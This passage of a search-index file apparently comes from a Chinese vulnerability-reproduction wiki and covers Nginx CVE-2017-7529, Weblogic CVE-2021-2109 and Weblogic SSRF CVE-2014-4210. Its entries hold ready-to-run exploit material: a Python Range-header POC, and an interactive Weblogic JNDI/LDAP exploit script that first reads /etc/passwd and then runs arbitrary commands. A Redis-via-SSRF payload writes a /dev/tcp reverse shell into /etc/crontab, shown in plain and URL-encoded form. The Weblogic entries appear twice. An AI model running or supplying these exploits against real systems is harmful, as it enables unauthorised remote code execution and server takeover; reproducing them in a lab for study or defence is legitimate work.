-9223372036854774591)\uff0c\u5c06\u53ef\u80fd\u8bfb\u53d6\u5230\u8d1f\u4f4d\u7f6e\u7684\u6570\u636e\u3002\u5982\u679c\u8fd9\u6b21\u8bf7\u6c42\u53c8\u547d\u4e2d\u4e86\u7f13\u5b58\u6587\u4ef6\uff0c\u5219\u53ef\u80fd\u5c31\u53ef\u4ee5\u8bfb\u53d6\u5230\u7f13\u5b58\u6587\u4ef6\u4e2d\u4f4d\u4e8e\u201cHTTP\u8fd4\u56de\u5305\u4f53\u201d\u524d\u7684\u201c\u6587\u4ef6\u5934\u201d\u3001\u201cHTTP\u8fd4\u56de\u5305\u5934\u201d\u7b49\u5185\u5bb9\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%20CVE-2017-7529/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Nginx version 0.5.6 - 1.13.2","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%20CVE-2017-7529/#\u73af\u5883\u642d\u5efa","text":"git clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8080 \u6b63\u5e38\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%20CVE-2017-7529/#\u6f0f\u6d1e\u590d\u73b0","text":"\u4f7f\u7528\u76ee\u5f55\u4e0b\u7684POC\u8fdb\u884c\u9a8c\u8bc1 python poc.py http://xxx.xxx.xxx.xxx:8080/","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%20CVE-2017-7529/#\u6f0f\u6d1e\u5229\u7528poc","text":"#!/usr/bin/env python import sys import requests if len ( sys . argv ) < 2 : print ( \" %s url\" % ( sys . argv [ 0 ])) print ( \"eg: python %s http://your-ip:8080/\" % ( sys . argv [ 0 ])) sys . exit () headers = { 'User-Agent' : \"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240\" } offset = 605 url = sys . argv [ 1 ] file_len = len ( requests . get ( url , headers = headers ) . content ) n = file_len + offset headers [ 'Range' ] = \"bytes=- %d ,- %d \" % ( n , 0x8000000000000000 - n ) r = requests . get ( url , headers = headers )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109/","text":"Weblogic LDAP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-2109 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2021\u5e741\u670820\u65e5\uff0c\u7eff\u76df\u79d1\u6280\u76d1\u6d4b\u53d1\u73b0Oracle\u5b98\u65b9\u53d1\u5e03\u4e862021\u5e741\u6708\u5173\u952e\u8865\u4e01\u66f4\u65b0\u516c\u544aCPU\uff08Critical Patch Update\uff09\uff0c\u5171\u4fee\u590d\u4e86329\u4e2a\u4e0d\u540c\u7a0b\u5ea6\u7684\u6f0f\u6d1e\uff0c\u5176\u4e2d\u5305\u62ec7\u4e2a\u5f71\u54cdWebLogic\u7684\u4e25\u91cd\u6f0f\u6d1e\uff08CVE-2021-1994\u3001CVE-2021-2047\u3001CVE-2021-2064\u3001CVE-2021-2108\u3001CVE-2021-2075\u3001CVE-2019-17195\u3001CVE-2020-14756\uff09\uff0c\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6b64\u6b21\u7684\u6f0f\u6d1e\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002CVSS\u8bc4\u5206\u5747\u4e3a9.8\uff0c\u5229\u7528\u590d\u6742\u5ea6\u4f4e\u3002\u5efa\u8bae\u7528\u6237\u5c3d\u5feb\u91c7\u53d6\u63aa\u65bd\uff0c\u5bf9\u4e0a\u8ff0\u6f0f\u6d1e\u8fdb\u884c\u9632\u62a4\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] WebLogic Server 10.3.6.0.0 WebLogic Server 12.1.3.0.0 WebLogic Server 12.2.1.3.0 WebLogic Server 12.2.1.4.0 WebLogic Server 14.1.1.0.0 \u73af\u5883\u642d\u5efa \u00b6 git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2020-14882 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:7001 \u6b63\u5e38\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u4e00\u4e0bURL http://xxx.xxx.xxx.xxx:7001/console/css/%252e%252e%252f/consolejndi.portal \u5982\u679c\u6709\u6b64\u9875\u9762\u672a\u6388\u6743\u53ef\u8bbf\u95ee\uff0c\u4e14\u5728\u5f71\u54cd\u8303\u56f4\u5185\u5219\u53ef\u80fd\u51fa\u73b0\u6f0f\u6d1e \u4e0b\u8f7d\u6f0f\u6d1e\u653b\u51fb\u9700\u8981\u7684 LDAP\u542f\u52a8\u811a\u672c \u4e0b\u8f7d\u94fe\u63a5 \u4e0b\u8f7d\u5230\u670d\u52a1\u5668\u4e0a\u542f\u52a8 java -jar JNDIExploit-v1.11.jar -i xxx.xxx.xxx.xxx ( \u670d\u52a1\u5668\u5730\u5740 ) [!NOTE] \u90e8\u5206\u670d\u52a1\u5668\u6ce8\u610f\u653e\u884c\u7aef\u53e3 \u7136\u540e\u914d\u5408 Weblogic\u672a\u6388\u6743\u8303\u56f4 \u547d\u4ee4\u6267\u884c /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) [!NOTE] \u6ce8\u610f ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho \u8fd9\u91cc LDAP\u670d\u52a1\u5668\u5730\u5740\u7b2c\u4e09\u4e2a\u5206\u9694\u7b26\u53f7\u4e3a ; \u767b\u5f55\u540e\u53f0\u53ef\u4f7f\u7528\u6b64POC\uff0c\u672a\u6388\u6743\u7684\u8bdd\u7528\u4e0a\u9762\u7684 /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] \u6ce8\u610f\u53c2\u6570\u683c\u5f0f Ldap >>> ldap://xxx.xxx.xxx;xxx:1389 \u4e2d\u7684\u5206\u53f7 \u5982\u679c\u4f7f\u7528\u5176\u4ed6\u7684\u5229\u7528Ldap\u670d\u52a1\u8bf7\u81ea\u884c\u66f4\u6539 POC\u5173\u952e\u5b57 \u6b64POC\u4ec5\u4ec5\u68c0\u9a8c\u6709\u672a\u6388\u6743\u7684\u60c5\u51b5 import requests import sys import re requests . packages . urllib3 . disable_warnings () from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Weblogic \u591a\u4e2a\u7248\u672c \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mLDAP >>> ldap://xxx.xxx.xxx;xxx:1389 \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , ldap_url , cmd ): vuln_url = target_url + \"/console/css/ %252e%252e /consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22 {} /Basic/WeblogicEcho;AdminServer%22)\" . format ( ldap_url ) print ( ' \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42: {} ' . format ( vuln_url )) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"cmd\" : cmd } try : response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"root:\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] \u547d\u4ee4\u6267\u884c\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u68c0\u67e5\u53c2\u6570\u548cLdap\u670d\u52a1\u662f\u5426\u6b63\u786e \\033 [0m\" , e ) def POC_2 ( target_url , ldap_url , cmd ): vuln_url = target_url + \"/console/css/ %252e%252e /consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22 {} /Basic/WeblogicEcho;AdminServer%22)\" . format ( ldap_url ) print ( ' \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42: {} ' . format ( vuln_url )) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"cmd\" : cmd } try : response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u68c0\u67e5\u53c2\u6570\u548cLdap\u670d\u52a1\u662f\u5426\u6b63\u786e \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) ldap_url = str ( input ( \" \\033 [35mLdap >>> \\033 [0m\" )) POC_1 ( target_url , ldap_url , cmd = \"cat /etc/passwd\" ) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , ldap_url , cmd ) Goby & POC \u00b6 [!NOTE] Weblogic LDAP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-2109 \u6ce8\u610f\u6f0f\u6d1e\u9a8c\u8bc1 Ldap\u53c2\u6570\u540c\u6837\u8ddf\u4e0a\u9762\u7684POC\u4e00\u6837\u683c\u5f0f\uff0c\u6ce8\u610f\u5206\u53f7","title":"Weblogic LDAP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-2109"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109/#weblogic-ldap-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e-cve-2021-2109","text":"","title":"Weblogic LDAP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-2109"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2021\u5e741\u670820\u65e5\uff0c\u7eff\u76df\u79d1\u6280\u76d1\u6d4b\u53d1\u73b0Oracle\u5b98\u65b9\u53d1\u5e03\u4e862021\u5e741\u6708\u5173\u952e\u8865\u4e01\u66f4\u65b0\u516c\u544aCPU\uff08Critical Patch Update\uff09\uff0c\u5171\u4fee\u590d\u4e86329\u4e2a\u4e0d\u540c\u7a0b\u5ea6\u7684\u6f0f\u6d1e\uff0c\u5176\u4e2d\u5305\u62ec7\u4e2a\u5f71\u54cdWebLogic\u7684\u4e25\u91cd\u6f0f\u6d1e\uff08CVE-2021-1994\u3001CVE-2021-2047\u3001CVE-2021-2064\u3001CVE-2021-2108\u3001CVE-2021-2075\u3001CVE-2019-17195\u3001CVE-2020-14756\uff09\uff0c\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6b64\u6b21\u7684\u6f0f\u6d1e\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002CVSS\u8bc4\u5206\u5747\u4e3a9.8\uff0c\u5229\u7528\u590d\u6742\u5ea6\u4f4e\u3002\u5efa\u8bae\u7528\u6237\u5c3d\u5feb\u91c7\u53d6\u63aa\u65bd\uff0c\u5bf9\u4e0a\u8ff0\u6f0f\u6d1e\u8fdb\u884c\u9632\u62a4\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] WebLogic Server 10.3.6.0.0 WebLogic Server 12.1.3.0.0 WebLogic Server 12.2.1.3.0 WebLogic Server 12.2.1.4.0 WebLogic Server 14.1.1.0.0","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109/#\u73af\u5883\u642d\u5efa","text":"git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2020-14882 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:7001 \u6b63\u5e38\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u4e00\u4e0bURL http://xxx.xxx.xxx.xxx:7001/console/css/%252e%252e%252f/consolejndi.portal \u5982\u679c\u6709\u6b64\u9875\u9762\u672a\u6388\u6743\u53ef\u8bbf\u95ee\uff0c\u4e14\u5728\u5f71\u54cd\u8303\u56f4\u5185\u5219\u53ef\u80fd\u51fa\u73b0\u6f0f\u6d1e \u4e0b\u8f7d\u6f0f\u6d1e\u653b\u51fb\u9700\u8981\u7684 LDAP\u542f\u52a8\u811a\u672c \u4e0b\u8f7d\u94fe\u63a5 \u4e0b\u8f7d\u5230\u670d\u52a1\u5668\u4e0a\u542f\u52a8 java -jar JNDIExploit-v1.11.jar -i xxx.xxx.xxx.xxx ( \u670d\u52a1\u5668\u5730\u5740 ) [!NOTE] \u90e8\u5206\u670d\u52a1\u5668\u6ce8\u610f\u653e\u884c\u7aef\u53e3 \u7136\u540e\u914d\u5408 Weblogic\u672a\u6388\u6743\u8303\u56f4 \u547d\u4ee4\u6267\u884c /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) [!NOTE] \u6ce8\u610f ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho \u8fd9\u91cc LDAP\u670d\u52a1\u5668\u5730\u5740\u7b2c\u4e09\u4e2a\u5206\u9694\u7b26\u53f7\u4e3a ; \u767b\u5f55\u540e\u53f0\u53ef\u4f7f\u7528\u6b64POC\uff0c\u672a\u6388\u6743\u7684\u8bdd\u7528\u4e0a\u9762\u7684 /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22)","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] \u6ce8\u610f\u53c2\u6570\u683c\u5f0f Ldap >>> ldap://xxx.xxx.xxx;xxx:1389 \u4e2d\u7684\u5206\u53f7 \u5982\u679c\u4f7f\u7528\u5176\u4ed6\u7684\u5229\u7528Ldap\u670d\u52a1\u8bf7\u81ea\u884c\u66f4\u6539 POC\u5173\u952e\u5b57 \u6b64POC\u4ec5\u4ec5\u68c0\u9a8c\u6709\u672a\u6388\u6743\u7684\u60c5\u51b5 import requests import sys import re requests . packages . urllib3 . disable_warnings () from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Weblogic \u591a\u4e2a\u7248\u672c \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mLDAP >>> ldap://xxx.xxx.xxx;xxx:1389 \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , ldap_url , cmd ): vuln_url = target_url + \"/console/css/ %252e%252e /consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22 {} /Basic/WeblogicEcho;AdminServer%22)\" . format ( ldap_url ) print ( ' \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42: {} ' . format ( vuln_url )) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"cmd\" : cmd } try : response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"root:\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] \u547d\u4ee4\u6267\u884c\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u68c0\u67e5\u53c2\u6570\u548cLdap\u670d\u52a1\u662f\u5426\u6b63\u786e \\033 [0m\" , e ) def POC_2 ( target_url , ldap_url , cmd ): vuln_url = target_url + \"/console/css/ %252e%252e /consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22 {} /Basic/WeblogicEcho;AdminServer%22)\" . format ( ldap_url ) print ( ' \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42: {} ' . format ( vuln_url )) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"cmd\" : cmd } try : response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u68c0\u67e5\u53c2\u6570\u548cLdap\u670d\u52a1\u662f\u5426\u6b63\u786e \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) ldap_url = str ( input ( \" \\033 [35mLdap >>> \\033 [0m\" )) POC_1 ( target_url , ldap_url , cmd = \"cat /etc/passwd\" ) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , ldap_url , cmd )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109/#goby--poc","text":"[!NOTE] Weblogic LDAP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-2109 \u6ce8\u610f\u6f0f\u6d1e\u9a8c\u8bc1 Ldap\u53c2\u6570\u540c\u6837\u8ddf\u4e0a\u9762\u7684POC\u4e00\u6837\u683c\u5f0f\uff0c\u6ce8\u610f\u5206\u53f7","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2014-4210/","text":"Weblogic SSRF\u6f0f\u6d1e CVE-2014-4210 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Weblogic\u4e2d\u5b58\u5728\u4e00\u4e2aSSRF\u6f0f\u6d1e\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u53ef\u4ee5\u53d1\u9001\u4efb\u610fHTTP\u8bf7\u6c42\uff0c\u8fdb\u800c\u653b\u51fb\u5185\u7f51\u4e2dredis\u3001fastcgi\u7b49\u8106\u5f31\u7ec4\u4ef6\uff0c\u6b64\u6f0f\u6d1e\u53ef\u901a\u8fc7HTTP\u534f\u8bae\u5229\u7528\uff0c\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u5f71\u54cd\u53d7\u5f71\u54cd\u7ec4\u4ef6\u7684\u673a\u5bc6\u6027 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Oracle WebLogic Server 10.0.2.0 Oracle WebLogic Server 10.3.6.0 \u73af\u5883\u642d\u5efa \u00b6 git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/ssrd docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:7001 \u6b63\u5e38\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u51fa\u73b0\u6f0f\u6d1e\u7684 URL\u4e3a : http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp \u4f7f\u7528 payload \u8fdb\u884c\u63a2\u6d4b, \u5c06\u63a2\u6d4b\u7684\u4f4d\u7f6e\u5199\u5728 operator\u53c2\u6570\u4e2d [!NOTE] \u6ce8\u610f\u9700\u8981\u77e5\u9053\u5185\u7f51 IP http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://xxx.xxx.xxx.xxx:7001 \u901a\u8fc7\u67e5\u770b\u62a5\u9519\u5185\u5bb9\u6765\u8fdb\u884c\u5224\u65ad \u5b58\u5728\u7684\u62a5\u9519\u5185\u5bb9\u5982\u56fe\uff0c\u5173\u952e\u5b57\u4e3a 404 , \u4f8b\u5982\u628a operator \u53c2\u6570\u6539\u6210 http://xxx.xxx.xxx.xxx:7000 \u8fd9\u6837\u4e0d\u5b58\u5728\u7684\u5219\u62a5\u9519\u5185\u5bb9\u5982\u4e0b\u56fe \u901a\u8fc7\u8fd9\u6837\u7684\u65b9\u6cd5\u5c31\u53ef\u4ee5\u63a2\u6d4b\u5185\u7f51\u7684\u5f00\u653e\u7aef\u53e3\u60c5\u51b5\uff0c\u4f8b\u5982\u5185\u7f51\u4e2d\u6709\u4e00\u53f0\u4e3b\u673a IP\uff1a172.19.0.2 \u5f00\u542f\u4e86 6379\u7aef\u53e3\u7684redis\u670d\u52a1 \u5982\u679c\u8bbf\u95ee\u7684\u975ehttp\u534f\u8bae\uff0c\u5219\u4f1a\u8fd4\u56de**did not have a valid SOAP content-type**\uff0c\u8fd9\u6837\u901a\u8fc7\u9519\u8bef\u7684\u4e0d\u540c\uff0c\u5373\u53ef\u63a2\u6d4b\u5185\u7f51\u72b6\u6001\u3002 Weblogic\u7684SSRF\u6709\u4e00\u4e2a\u6bd4\u8f83\u5927\u7684\u7279\u70b9\uff0c\u5176\u867d\u7136\u662f\u4e00\u4e2a\u201cGET\u201d\u8bf7\u6c42\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f20\u5165 %0a%0d \u6765\u6ce8\u5165\u6362\u884c\u7b26\uff0c\u800c\u67d0\u4e9b\u670d\u52a1\uff08\u5982redis\uff09\u662f\u901a\u8fc7\u6362\u884c\u7b26\u6765\u5206\u9694\u6bcf\u6761\u547d\u4ee4\uff0c\u4e5f\u5c31\u8bf4\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8be5SSRF\u653b\u51fb\u5185\u7f51\u4e2d\u7684redis\u670d\u52a1\u5668\u3002 \u53d1\u9001\u4e09\u6761redis\u547d\u4ee4\uff0c\u5c06\u5f39shell\u811a\u672c\u5199\u5165**/etc/crontab** \u4e2d\uff1a set 1 \"\\n\\n\\n\\n* * * * * root bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1\\n\\n\\n\\n\" config set dir /etc/ config set dbfilename crontab save \u63a5\u7740\u518d\u5c06\u8bf7\u6c42\u8fdb\u884c url\u7f16\u7801 , [!NOTE] \u6ce8\u610f\uff0c\u6362\u884c\u7b26\u662f\u201c\\r\\n\u201d\uff0c\u4e5f\u5c31\u662f\u201c%0D%0A\u201d test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa 